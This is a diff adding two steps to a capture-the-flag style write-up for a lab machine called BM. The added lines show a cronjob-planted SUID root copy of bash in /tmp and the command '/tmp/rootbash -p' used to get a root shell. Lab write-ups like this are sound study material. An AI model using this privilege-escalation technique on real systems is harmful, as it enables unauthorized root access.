@@ -649,6 +649,20 @@ SMB         192.168.110.34  445    BM               IPC$                        
 	```
 	![](Pasted%20image%2020220224020112.png)
 6. Wait for cronjob to execute
+	``` 
+	eric@BM:/tmp$ ls -la
+	total 4944
+	...
+	-rw-r--r--  1 root root       0 Feb 22 01:24 passwd
+	-rwxrwxr-x  1 eric eric 3078592 Feb 22 03:00 pspy64
+	-rwsr-xr-x  1 root root 1037528 Feb 22 05:17 rootbash
+	...
+	```
+7. Obtain root
+	``` 
+	eric@BM:/tmp$ /tmp/rootbash -p
+	```
+	![](Pasted%20image%2020220224025933.png)
 
 # /PRIVATE - Crack Truecrypt Volume
 1. View files in `/PRIVATE/`
